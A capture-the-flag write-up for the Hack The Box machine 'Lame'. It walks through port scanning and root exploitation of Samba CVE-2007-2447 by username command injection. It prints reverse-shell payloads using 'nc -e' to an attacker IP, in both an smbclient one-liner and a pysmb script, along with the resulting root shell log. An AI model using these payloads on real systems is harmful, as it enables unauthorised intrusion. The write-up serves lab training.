# Lame — Writeup
> Hack The Box | Easy | 2026-03-24

## Summary

Lame is an easy Linux box running several outdated services. The attack chain is straightforward: Samba 3.0.20 is vulnerable to CVE-2007-2447, a pre-authentication command injection in the username field that yields a direct root shell. No privilege escalation is needed — the exploit lands as root in a single step.

## Reconnaissance

A full TCP port scan reveals five services:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU 4.2.4)
```

```bash
nmap -p- -sC -sV -T4 10.129.8.218
```

Additional recon:
- **FTP (21):** Anonymous login is allowed but the listing is empty — nothing useful.
- **SMB (445):** Null session succeeds. Shares exposed: `print$`, `tmp`, `opt`, `IPC$`, `ADMIN$`. The `tmp` share is writable. Message signing is disabled and SMB2 negotiation fails (SMB1 only).
- **SSH (22):** Very old OpenSSH. Useful for stable access after exploitation, but not a direct attack vector.
- **distccd (3632):** Distributed compiler daemon with no access restrictions. A viable fallback (CVE-2004-2687) but only yields a low-privilege shell.

The version inventory tells the story immediately: Samba 3.0.20 is within the affected range for CVE-2007-2447, one of the most reliable remote root exploits for Linux SMB services. vsftpd 2.3.4 is the famously backdoored version (CVE-2011-2523), but that backdoor is frequently non-functional on HTB instances since it only affects a specific compromised binary that was distributed during a narrow window in 2011.

Samba is the clear primary target — confirmed vulnerable version, no authentication required, direct root execution.

## Foothold (and Root)

### The Vulnerability: CVE-2007-2447

Samba versions 3.0.0 through 3.0.25rc3 pass user-supplied input from MS-RPC calls directly to `/bin/sh` when external scripts (like the `username map script` configuration option) are invoked. Because the username is not sanitized, shell metacharacters in the username field are interpreted by the shell.

The primitive here is **unsanitized string-to-shell passthrough**. Any input that reaches `/bin/sh` without sanitization is exploitable via backticks, `$()` command substitution, semicolons, or pipes. This isn't just a "Samba bug" — it's the universal consequence of passing untrusted input to a shell interpreter. The fix (applied in 3.0.25) was to sanitize the input before it reaches the shell.

Critically, this happens **before authentication** — the username is processed for mapping before any credential check occurs. The smbd process runs as root, so command execution is as root.

### Exploitation

**Attempt 1 — smbclient (failed):**

The natural first attempt is injecting a reverse shell payload into the `logon` command in smbclient:

```bash
echo 'logon "/=`nohup nc -e /bin/sh 10.10.14.91 4444`"' | smbclient //10.129.8.218/tmp --no-pass
```

This fails silently. smbclient escapes shell metacharacters in the username before sending them over the wire — the backticks never reach the Samba server as raw shell characters. This is an important lesson: the exploit requires the metacharacters to arrive *unescaped* at the server's MS-RPC handler.

**Attempt 2 — pysmb (success):**

The Python `pysmb` library sends the username string directly in the SMB protocol without local shell interpretation. This delivers the payload raw:

```python
from smb.SMBConnection import SMBConnection

# Start listener first: nc -lvnp 4444
conn = SMBConnection(
    '/=`nohup nc -e /bin/bash 10.10.14.91 4444`',  # injected username
    'anything',      # password (irrelevant)
    'KALI',          # client name
    'LAME',          # server name
    use_ntlm_v2=False
)
conn.connect('10.129.8.218', 445)
```

The backtick-wrapped command is passed to `/bin/sh` by smbd, which executes `nc -e /bin/bash` back to the attacker's listener. The callback arrives as root:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.8.218] 39152

id
uid=0(root) gid=0(root)
```

Both flags are immediately accessible from the root shell.

## Flags

```
user.txt: [REDACTED]
root.txt: [REDACTED]
```

## Key Takeaways

1. **The delivery mechanism matters as much as the vulnerability.** CVE-2007-2447 is trivial in principle, but smbclient's local escaping prevents exploitation. Understanding *how* your payload reaches the target — not just *what* the vulnerability is — determines success or failure. pysmb worked because it doesn't interpret the username string locally.

2. **Unsanitized input to shell interpreters is the root primitive.** This vulnerability isn't unique to Samba — any code that passes user input to `/bin/sh` without sanitization creates the same class of bug. Recognizing the primitive (string-to-shell passthrough) lets you reason about all delivery forms, not just the one a PoC demonstrates.

3. **Pre-authentication attack surface is the highest priority.** Services that process user input before authentication (like Samba's username mapping) offer the widest attack window. During recon, always note which services handle input before any auth gate.

4. **Version identification drives the entire operation.** Every service on this box has a confirmed, specific version. One nmap scan immediately surfaces three CVEs with public exploits. On older systems especially, clean version identification often makes the box.

5. **Always have a fallback path.** Even with a high-confidence primary, having distccd (CVE-2004-2687) as a known fallback for user-level access means a single failure doesn't stall the operation.
